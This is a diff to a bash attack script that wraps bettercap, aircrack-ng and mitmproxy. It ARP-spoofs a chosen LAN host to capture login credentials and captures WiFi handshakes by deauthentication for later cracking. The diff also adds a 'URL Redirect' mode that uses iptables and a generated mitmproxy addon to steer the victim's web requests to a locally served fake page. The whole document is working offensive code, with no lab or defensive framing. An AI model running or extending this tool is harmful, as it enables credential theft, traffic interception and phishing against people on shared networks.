@@ -13,6 +13,11 @@ HANDSHAKE_DIR="$SCRIPT_DIR/handshakes"
 CRED_FILE="$SCRIPT_DIR/credentials.txt"
 CRED_HOOK="$SCRIPT_DIR/credential_hook.js"
 
+MITM_PID=""
+BC_PID=""
+HTTP_PID=""
+CLEANUP_DONE=0
+
 mkdir -p "$HANDSHAKE_DIR"
 
 if [[ ! -f "$CRED_HOOK" ]]; then
@@ -103,6 +108,41 @@ print_warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
 print_err()  { echo -e "  ${RED}[✘]${NC} $1"; }
 print_info() { echo -e "  ${CYAN}[i]${NC} $1"; }
 
+cleanup_all() {
+    if [[ "$CLEANUP_DONE" -eq 1 ]]; then
+        return
+    fi
+    CLEANUP_DONE=1
+
+    echo ""
+    echo -e "  ${CYAN}[i]${NC} Cleaning up..."
+
+    if [[ -n "$BC_PID" ]]; then
+        kill "$BC_PID" 2>/dev/null
+    fi
+    if [[ -n "$MITM_PID" ]]; then
+        kill "$MITM_PID" 2>/dev/null
+    fi
+    if [[ -n "$HTTP_PID" ]]; then
+        kill "$HTTP_PID" 2>/dev/null
+    fi
+
+    pkill -f "mitmdump -s" 2>/dev/null
+    pkill -f "bettercap" 2>/dev/null
+    pkill -f "http.server 80" 2>/dev/null
+
+    if [[ -n "$IFACE" ]]; then
+        iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
+        iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080 2>/dev/null
+    fi
+
+    echo 0 > /proc/sys/net/ipv4/ip_forward
+
+    echo -e "  ${GREEN}[✔]${NC} Cleanup complete."
+}
+
+trap 'cleanup_all; exit 0' SIGINT SIGTERM
+
 reset_adapter() {
     local iface="$1"
     print_info "Resetting adapter ${BOLD}${iface}${NC}..."
@@ -132,6 +172,92 @@ force_resolve_mac() {
     fi
 
     echo "$mac"
+}
+
+detect_gateway() {
+    local gw=""
+
+    gw=$(ip route | awk '/default/ {print $3; exit}')
+
+    if [[ -z "$gw" ]]; then
+        local hex
+        hex=$(awk '$2 == "00000000" {print $3; exit}' /proc/net/route)
+        if [[ -n "$hex" ]]; then
+            gw=$(printf "%d.%d.%d.%d" "0x${hex:6:2}" "0x${hex:4:2}" "0x${hex:2:2}" "0x${hex:0:2}")
+        fi
+    fi
+
+    if [[ -z "$gw" ]]; then
+        gw=$(arp -n 2>/dev/null | awk '/^192\.168\./ && $3 != "(incomplete)" {print $1; exit}')
+    fi
+
+    echo "$gw"
+}
+
+detect_my_ip() {
+    local ips=()
+    local ifaces=()
+
+    while IFS= read -r line; do
+        local iface ip
+        iface=$(echo "$line" | awk '{print $NF}')
+        ip=$(echo "$line" | awk '{print $2}' | cut -d/ -f1)
+        if [[ -n "$ip" && "$ip" != "127.0.0.1" ]]; then
+            ips+=("$ip")
+            ifaces+=("$iface")
+        fi
+    done < <(ip -4 addr show 2>/dev/null | grep -E "inet ")
+
+    if [[ ${#ips[@]} -eq 0 ]]; then
+        echo ""
+        return
+    fi
+
+    local lan_ips=()
+    local lan_ifaces=()
+    for i in "${!ips[@]}"; do
+        if [[ "${ips[$i]}" == 192.168.* ]]; then
+            lan_ips+=("${ips[$i]}")
+            lan_ifaces+=("${ifaces[$i]}")
+        fi
+    done
+
+    if [[ ${#lan_ips[@]} -eq 1 ]]; then
+        echo "${lan_ips[0]}"
+        return
+    fi
+
+    if [[ ${#lan_ips[@]} -gt 1 ]]; then
+        echo -e "  ${CYAN}[i]${NC} Multiple 192.168.x.x IPs detected:" >&2
+        for i in "${!lan_ips[@]}"; do
+            echo -e "    ${CYAN}[$((i+1))]${NC} ${lan_ifaces[$i]} → ${lan_ips[$i]}" >&2
+        done
+        local choice
+        read -p "$(echo -e "${MAGENTA}➜${NC} Select IP for redirect: ")" choice
+        if [[ -z "$choice" || "$choice" -lt 1 || "$choice" -gt ${#lan_ips[@]} ]]; then
+            echo "${lan_ips[0]}"
+        else
+            echo "${lan_ips[$((choice-1))]}"
+        fi
+        return
+    fi
+
+    if [[ ${#ips[@]} -eq 1 ]]; then
+        echo "${ips[0]}"
+        return
+    fi
+
+    echo -e "  ${CYAN}[i]${NC} No 192.168.x.x IP found. Available IPs:" >&2
+    for i in "${!ips[@]}"; do
+        echo -e "    ${CYAN}[$((i+1))]${NC} ${ifaces[$i]} → ${ips[$i]}" >&2
+    done
+    local choice
+    read -p "$(echo -e "${MAGENTA}➜${NC} Select IP for redirect: ")" choice
+    if [[ -z "$choice" || "$choice" -lt 1 || "$choice" -gt ${#ips[@]} ]]; then
+        echo "${ips[0]}"
+    else
+        echo "${ips[$((choice-1))]}"
+    fi
 }
 
 verify_handshake() {
@@ -197,7 +323,7 @@ else
         BC_VERSION=$(bettercap -version 2>&1 | head -n 1)
         print_ok "bettercap installed: ${BOLD}${BC_VERSION}${NC}"
     else
-        print_err "bettercap installation failed. Install manually: apt install bettercap"
+        print_err "bettercap installation failed."
         exit 1
     fi
 fi
@@ -210,7 +336,20 @@ else
     if command -v aircrack-ng &>/dev/null; then
         print_ok "aircrack-ng installed."
     else
-        print_err "aircrack-ng installation failed. Install manually: apt install aircrack-ng"
+        print_err "aircrack-ng installation failed."
+        exit 1
+    fi
+fi
+
+if command -v mitmdump &>/dev/null; then
+    print_ok "mitmdump installed."
+else
+    print_warn "mitmdump not found. Installing mitmproxy..."
+    apt install -y mitmproxy -qq
+    if command -v mitmdump &>/dev/null; then
+        print_ok "mitmdump installed."
+    else
+        print_err "mitmdump installation failed."
         exit 1
     fi
 fi
@@ -243,28 +382,26 @@ fi
 
 print_section "STEP 2 • Select Mode"
 
-echo -e "  ${CYAN}[1]${NC} MITM Attack       ${DIM}(scan LAN, show IP list, select target)${NC}"
-echo -e "  ${CYAN}[2]${NC} Handshake Capture ${DIM}(scan WiFi, show ESSID list, select AP)${NC}"
-echo -e "  ${CYAN}[3]${NC} Exit"
+echo -e "  ${CYAN}[1]${NC} MITM Attack          ${DIM}(ARP spoof + sniff + credential capture)${NC}"
+echo -e "  ${CYAN}[2]${NC} Handshake Capture    ${DIM}(scan WiFi, capture + verify)${NC}"
+echo -e "  ${CYAN}[3]${NC} URL Redirect         ${DIM}(ARP spoof + mitmdump + iptables)${NC}"
+echo -e "  ${CYAN}[4]${NC} Exit"
 echo
-read -p "$(echo -e "${MAGENTA}➜${NC} Option [1-3]: ")" MODE
+read -p "$(echo -e "${MAGENTA}➜${NC} Option [1-4]: ")" MODE
 
 if [[ "$MODE" == "1" ]]; then
     print_section "MITM Mode • Network Discovery"
 
     sleep 2
 
-    AUTO_GW=$(ip route | awk '/default/ {print $3; exit}')
+    AUTO_GW=$(detect_gateway)
     if [[ -z "$AUTO_GW" ]]; then
         print_warn "No default gateway detected."
         read -p "$(echo -e "${MAGENTA}➜${NC} Enter gateway IP manually: ")" AUTO_GW
-        if [[ -z "$AUTO_GW" ]]; then
-            print_err "Gateway IP required."; exit 1
-        fi
+        if [[ -z "$AUTO_GW" ]]; then print_err "Gateway required."; exit 1; fi
     fi
     print_info "Gateway: ${BOLD}${AUTO_GW}${NC}"
 
-    print_info "Warming up gateway ARP cache..."
     ping -c 3 -W 2 "$AUTO_GW" &>/dev/null
     sleep 1
 
@@ -272,13 +409,13 @@ if [[ "$MODE" == "1" ]]; then
     if [[ -n "$GW_MAC" ]]; then
         print_ok "Gateway MAC: ${BOLD}${GW_MAC}${NC}"
     else
-        print_warn "Gateway MAC still unresolved. Spoofing may fail."
+        print_warn "Gateway MAC unresolved."
     fi
 
     echo 1 > /proc/sys/net/ipv4/ip_forward
     print_ok "IP Forwarding enabled."
 
-    print_info "Starting network probe (25 seconds, throttle=2)..."
+    print_info "Starting network probe (25s)..."
     MITM_LOG="/tmp/mitm_probe_$$.log"
     bettercap -iface "$IFACE" -gateway-override "$AUTO_GW" -eval "
         set net.probe.throttle 2;
@@ -301,22 +438,17 @@ if [[ "$MODE" == "1" ]]; then
             }
         }'
     )
-
-    if [[ ${#HOSTS[@]} -eq 0 ]]; then
-        print_warn "Bettercap found no hosts. Reading system ARP table..."
-        mapfile -t HOSTS < <(
-            ip neigh show | awk '
-                $3 == "lladdr" && $NF != "FAILED" {
-                    print $1 "|" $5 "|" "-"
-                }'
-        )
-    fi
     rm -f "$MITM_LOG"
 
     if [[ ${#HOSTS[@]} -eq 0 ]]; then
-        print_err "No hosts found. AP isolation may be enabled on router."
-        print_info "Disable 'AP Isolation' / 'Client Isolation' in router settings."
-        echo 0 > /proc/sys/net/ipv4/ip_forward
+        print_warn "Bettercap found no hosts. Reading ARP table..."
+        mapfile -t HOSTS < <(
+            ip neigh show | awk '$3 == "lladdr" && $NF != "FAILED" {print $1 "|" $5 "|" "-"}'
+        )
+    fi
+
+    if [[ ${#HOSTS[@]} -eq 0 ]]; then
+        print_err "No hosts found. AP isolation?"
         exit 1
     fi
 
@@ -334,28 +466,23 @@ if [[ "$MODE" == "1" ]]; then
     echo
     read -p "$(echo -e "${MAGENTA}➜${NC} Select target IP number: ")" HOST_CHOICE
     IFS='|' read -r TARGET_IP _ _ <<< "${HOSTS[$((HOST_CHOICE-1))]}"
-
     if [[ -z "$TARGET_IP" ]]; then
         print_err "Invalid selection."
-        echo 0 > /proc/sys/net/ipv4/ip_forward
         exit 1
     fi
     print_ok "Target: ${BOLD}${TARGET_IP}${NC}"
 
-    print_info "Forcing target MAC resolution..."
     TARGET_MAC=$(force_resolve_mac "$TARGET_IP" "$IFACE")
     if [[ -z "$TARGET_MAC" ]]; then
-        print_err "Target MAC could not be resolved."
-        echo 0 > /proc/sys/net/ipv4/ip_forward
+        print_err "Target MAC unresolved."
         exit 1
     fi
     print_ok "Target MAC: ${BOLD}${TARGET_MAC}${NC}"
 
     sleep 3
-
     rm -f "$CRED_FILE"
 
-    print_info "Starting ARP spoof + sniff. Press Ctrl+C to stop."
+    print_info "Starting ARP spoof + credential capture. Press Ctrl+C to stop."
     echo
 
     bettercap -iface "$IFACE" -gateway-override "$AUTO_GW" -eval "
@@ -373,8 +500,6 @@ if [[ "$MODE" == "1" ]]; then
     net.sniff on
 "
 
-    echo
-    print_info "Cleaning up..."
     echo 0 > /proc/sys/net/ipv4/ip_forward
     print_ok "IP Forwarding disabled."
 
@@ -383,21 +508,16 @@ if [[ "$MODE" == "1" ]]; then
         print_ok "${GREEN}${BOLD}Credentials captured!${NC}"
         echo
         cat "$CRED_FILE"
-        print_info "Saved to: ${BOLD}${CRED_FILE}${NC}"
     else
         print_warn "No credentials captured."
-        print_info "Possible reasons:"
-        echo -e "    ${DIM}• Target did not submit any HTTP login form${NC}"
-        echo -e "    ${DIM}• Login was over HTTPS (SSL strip failed or HSTS blocked)${NC}"
-        echo -e "    ${DIM}• Credentials field names not recognized by hook${NC}"
-        echo -e "    ${DIM}• Check pcap: /tmp/mitm_capture.pcap (Wireshark filter: http.request.method == \"POST\")${NC}"
+        echo -e "    ${DIM}• Login over HTTPS + HSTS = sslstrip fail${NC}"
+        echo -e "    • Check pcap: /tmp/mitm_capture.pcap${NC}"
     fi
 
 elif [[ "$MODE" == "2" ]]; then
     print_section "Handshake Mode • WiFi Scan"
 
     print_info "Scanning WiFi networks (20 seconds)..."
-    print_warn "Monitor mode will be enabled automatically."
 
     SCAN_LOG="/tmp/wifi_scan_$$.log"
     bettercap -iface "$IFACE" -eval "
@@ -423,10 +543,7 @@ elif [[ "$MODE" == "2" ]]; then
     )
     rm -f "$SCAN_LOG"
 
-    if [[ ${#APS[@]} -eq 0 ]]; then
-        print_err "No networks found. Try again."
-        exit 1
-    fi
+    if [[ ${#APS[@]} -eq 0 ]]; then print_err "No networks found."; exit 1; fi
 
     print_section "Discovered Networks"
     echo
@@ -440,34 +557,19 @@ elif [[ "$MODE" == "2" ]]; then
     done
 
     echo
-    read -p "$(echo -e "${MAGENTA}➜${NC} Select network number: ")" AP_CHOICE
+    read -p "$(echo -e "${MAGENTA}➜${NC} Select network: ")" AP_CHOICE
     IFS='|' read -r TARGET_BSSID TARGET_ESSID TARGET_CHANNEL <<< "${APS[$((AP_CHOICE-1))]}"
-
-    if [[ -z "$TARGET_BSSID" ]]; then
-        print_err "Invalid selection."
-        exit 1
-    fi
+    if [[ -z "$TARGET_BSSID" ]]; then print_err "Invalid."; exit 1; fi
 
     print_ok "Target: ${BOLD}${TARGET_ESSID}${NC} (${TARGET_BSSID}) Ch ${TARGET_CHANNEL}"
 
     SAFE_ESSID=$(echo "$TARGET_ESSID" | tr -c 'A-Za-z0-9_-' '_')
-
-    print_section "Handshake Save Location"
-    echo -e "  ${CYAN}[1]${NC} ${BOLD}${HANDSHAKE_DIR}/${SAFE_ESSID}.pcap${NC} (default)"
-    echo -e "  ${CYAN}[2]${NC} /root/${SAFE_ESSID}.pcap"
-    echo
-    read -p "$(echo -e "${MAGENTA}➜${NC} Choice [1-2, default 1]: ")" PATH_CHOICE
-
-    case "$PATH_CHOICE" in
-        2) HS_FILE="/root/${SAFE_ESSID}.pcap" ;;
-        *) HS_FILE="$HANDSHAKE_DIR/${SAFE_ESSID}.pcap" ;;
-    esac
-
+    HS_FILE="$HANDSHAKE_DIR/${SAFE_ESSID}.pcap"
     rm -f "$HS_FILE"
     print_ok "Handshake file: ${BOLD}${HS_FILE}${NC}"
 
     reset_adapter "$IFACE"
-    print_info "Attempt 1: Clientless PMKID via wifi.assoc (15s)..."
+    print_info "Attempt 1: PMKID via wifi.assoc (15s)..."
 
     ASSOC_LOG="/tmp/assoc_$$.log"
     bettercap -iface "$IFACE" -eval "
@@ -482,11 +584,9 @@ elif [[ "$MODE" == "2" ]]; then
     " > "$ASSOC_LOG" 2>&1
 
     if [[ ! -f "$HS_FILE" ]]; then
-        print_warn "wifi.assoc did not produce a capture file."
+        print_warn "wifi.assoc failed. Trying deauth..."
         reset_adapter "$IFACE"
-
-        print_info "Attempt 2: wifi.deauth fallback (25s)..."
-        print_warn "Deauth requires at least one client connected to the AP."
+        print_info "Attempt 2: wifi.deauth (25s)..."
 
         DEAUTH_LOG="/tmp/deauth_$$.log"
         bettercap -iface "$IFACE" -eval "
@@ -501,13 +601,10 @@ elif [[ "$MODE" == "2" ]]; then
             exit
         " > "$DEAUTH_LOG" 2>&1
 
-        if grep -q "unknown BSSID, is in the deauth skip list, or doesn't have detected clients" "$DEAUTH_LOG"; then
-            print_err "Deauth rejected: no client detected on this AP."
-            print_info "Connect a device to '${TARGET_ESSID}' and try again."
-        fi
+        grep -q "no client detected" "$DEAUTH_LOG" && print_warn "No client connected to AP."
         rm -f "$DEAUTH_LOG"
     else
-        print_ok "PMKID attempt succeeded (file created)."
+        print_ok "PMKID succeeded."
     fi
 
     rm -f "$ASSOC_LOG"
@@ -516,31 +613,194 @@ elif [[ "$MODE" == "2" ]]; then
     print_section "Handshake Verification"
 
     if [[ -f "$HS_FILE" ]]; then
-        print_ok "Capture file: ${BOLD}${HS_FILE}${NC}"
-        echo
-
+        print_ok "Capture: ${BOLD}${HS_FILE}${NC}"
         if verify_handshake "$HS_FILE"; then
-            echo
-            print_ok "${GREEN}${BOLD}Handshake is COMPLETE and valid for cracking.${NC}"
-            print_info "Crack with: aircrack-ng -w <wordlist> \"$HS_FILE\""
+            print_ok "${GREEN}${BOLD}Handshake COMPLETE.${NC}"
         else
-            echo
-            print_warn "${YELLOW}Handshake may be INCOMPLETE (half capture).${NC}"
-            print_info "Try again — connect a device to the AP and re-run."
+            print_warn "${YELLOW}Handshake INCOMPLETE.${NC}"
         fi
     else
-        print_warn "No capture file created at $HS_FILE"
-        print_info "Possible reasons:"
-        echo -e "    ${DIM}• No client connected to the AP (deauth needs one)${NC}"
-        echo -e "    ${DIM}• AP is not PMKID-vulnerable (assoc skipped)${NC}"
-        echo -e "    ${DIM}• PMF (802.11w) enabled on router — blocks deauth${NC}"
-        echo -e "    ${DIM}• Adapter does not support monitor mode + injection${NC}"
+        print_warn "No capture file created."
     fi
 
 elif [[ "$MODE" == "3" ]]; then
+    print_section "URL Redirect Mode • ARP spoof + mitmdump"
+
+    AUTO_GW=$(detect_gateway)
+    if [[ -z "$AUTO_GW" ]]; then
+        print_warn "No default gateway detected."
+        read -p "$(echo -e "${MAGENTA}➜${NC} Enter gateway IP manually: ")" AUTO_GW
+        if [[ -z "$AUTO_GW" ]]; then print_err "Gateway required."; exit 1; fi
+    fi
+    print_info "Gateway: ${BOLD}${AUTO_GW}${NC}"
+
+    MY_IP=$(detect_my_ip)
+    if [[ -z "$MY_IP" ]]; then
+        print_err "Could not detect your local IP. Aborting."
+        exit 1
+    fi
+    print_info "Your IP: ${BOLD}${MY_IP}${NC}"
+
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    print_ok "IP Forwarding enabled."
+
+    print_info "Starting network probe (25s)..."
+    MITM_LOG="/tmp/mitm_probe_$$.log"
+    bettercap -iface "$IFACE" -gateway-override "$AUTO_GW" -eval "
+        set net.probe.throttle 2;
+        net.probe on;
+        sleep 25;
+        net.show;
+        sleep 3;
+        net.probe off;
+        exit
+    " > "$MITM_LOG" 2>&1
+
+    mapfile -t HOSTS < <(
+        grep -E '^\│' "$MITM_LOG" | \
+        awk -F'│' '{
+            gsub(/^[ \t]+|[ \t]+$/, "", $2);
+            gsub(/^[ \t]+|[ \t]+$/, "", $3);
+            gsub(/^[ \t]+|[ \t]+$/, "", $4);
+            if ($2 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $3 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) {
+                print $2 "|" $3 "|" $4
+            }
+        }'
+    )
+    rm -f "$MITM_LOG"
+
+    if [[ ${#HOSTS[@]} -eq 0 ]]; then
+        print_warn "Bettercap found no hosts. Reading ARP table..."
+        mapfile -t HOSTS < <(
+            ip neigh show | awk '$3 == "lladdr" && $NF != "FAILED" {print $1 "|" $5 "|" "-"}'
+        )
+    fi
+
+    if [[ ${#HOSTS[@]} -eq 0 ]]; then
+        print_err "No hosts found. AP isolation?"
+        exit 1
+    fi
+
+    print_section "Discovered Hosts"
+    echo
+    printf "  ${BOLD}%-4s %-18s %-20s %-20s${NC}\n" "No." "IP" "MAC" "Vendor/Name"
+    echo "  ──────────────────────────────────────────────────────────────"
+    i=1
+    for entry in "${HOSTS[@]}"; do
+        IFS='|' read -r ip mac name <<< "$entry"
+        printf "  ${CYAN}%-4s${NC} %-18s %-20s %-20s\n" "$i" "$ip" "$mac" "$name"
+        ((i++))
+    done
+
+    echo
+    read -p "$(echo -e "${MAGENTA}➜${NC} Select target IP number: ")" HOST_CHOICE
+    IFS='|' read -r TARGET_IP _ _ <<< "${HOSTS[$((HOST_CHOICE-1))]}"
+    if [[ -z "$TARGET_IP" ]]; then
+        print_err "Invalid selection."
+        exit 1
+    fi
+    print_ok "Target: ${BOLD}${TARGET_IP}${NC}"
+
+    TARGET_MAC=$(force_resolve_mac "$TARGET_IP" "$IFACE")
+    if [[ -z "$TARGET_MAC" ]]; then
+        print_err "Target MAC unresolved."
+        exit 1
+    fi
+    print_ok "Target MAC: ${BOLD}${TARGET_MAC}${NC}"
+
+    print_info "Enter the file path to redirect victims to."
+    print_info "Example: fake.html (must be in script folder)"
+    print_info "Example: /home/mrunknown/fake.html"
+    echo
+    read -e -p "$(echo -e "${MAGENTA}➜${NC} File path: ")" REDIRECT_FILE
+    if [[ -z "$REDIRECT_FILE" ]]; then
+        print_err "File path required."
+        exit 1
+    fi
+
+    if [[ ! -f "$REDIRECT_FILE" ]]; then
+        print_warn "File not found at: $REDIRECT_FILE"
+        print_info "Place the file there or continue (redirect will fail)."
+        read -p "$(echo -e "${MAGENTA}➜${NC} Continue anyway? [y/N]: ")" CONT
+        if [[ "$CONT" != "y" && "$CONT" != "Y" ]]; then
+            exit 1
+        fi
+    else
+        print_ok "File found: $REDIRECT_FILE"
+    fi
+
+    REDIRECT_BASENAME=$(basename "$REDIRECT_FILE")
+    REDIRECT_DIR=$(dirname "$REDIRECT_FILE")
+    [[ "$REDIRECT_DIR" == "." ]] && REDIRECT_DIR="$SCRIPT_DIR"
+
+    REDIRECT_HOST="$MY_IP"
+    REDIRECT_PATH="/$REDIRECT_BASENAME"
+    REDIRECT_URL="http://$REDIRECT_HOST$REDIRECT_PATH"
+
+    print_info "Redirecting to: ${BOLD}${REDIRECT_URL}${NC}"
+
+    REDIRECT_ADDON="$SCRIPT_DIR/redirect_addon.py"
+    cat > "$REDIRECT_ADDON" << EOF
+from mitmproxy import http
+
+REDIRECT_HOST = "$REDIRECT_HOST"
+REDIRECT_PATH = "$REDIRECT_PATH"
+
+def request(flow: http.HTTPFlow) -> None:
+    accept = flow.request.headers.get("Accept", "")
+    if "text/html" not in accept:
+        return
+
+    ext = flow.request.path.lower()
+    if ext.endswith(".exe") or ext.endswith(".zip") or ext.endswith(".pdf") or ext.endswith(".apk"):
+        return
+
+    flow.request.host = REDIRECT_HOST
+    flow.request.port = 80
+    flow.request.scheme = "http"
+    flow.request.path = REDIRECT_PATH
+EOF
+
+    print_ok "Addon generated: ${BOLD}${REDIRECT_ADDON}${NC}"
+
+    if ss -tuln 2>/dev/null | grep -q ":80 "; then
+        print_warn "Port 80 is already in use. Using existing server."
+        HTTP_PID=""
+    else
+        print_info "Starting HTTP server on port 80..."
+        cd "$REDIRECT_DIR" || { print_err "Cannot cd to $REDIRECT_DIR"; exit 1; }
+        python3 -m http.server 80 &
+        HTTP_PID=$!
+        sleep 1
+        print_ok "HTTP server running (PID: $HTTP_PID)"
+    fi
+
+    print_info "Setting up iptables redirect to mitmdump (port 8080)..."
+    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
+    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080
+    print_ok "iptables rules added."
+
+    mitmdump -s "$REDIRECT_ADDON" --mode transparent &
+    MITM_PID=$!
+    print_ok "mitmdump running (PID: $MITM_PID)"
+
+    bettercap -iface "$IFACE" -gateway-override "$AUTO_GW" -eval "
+        set arp.spoof.fullduplex true;
+        set arp.spoof.targets $TARGET_IP;
+        set arp.spoof.internal false;
+        arp.spoof on
+    " &
+    BC_PID=$!
+    print_ok "Bettercap ARP spoof running (PID: $BC_PID)"
+
+    print_info "Press Enter to stop."
+    read -p ""
+
+    cleanup_all
+
+elif [[ "$MODE" == "4" ]]; then
     print_info "Exiting."
     exit 0
-
 else
     print_err "Invalid option."
     exit 1
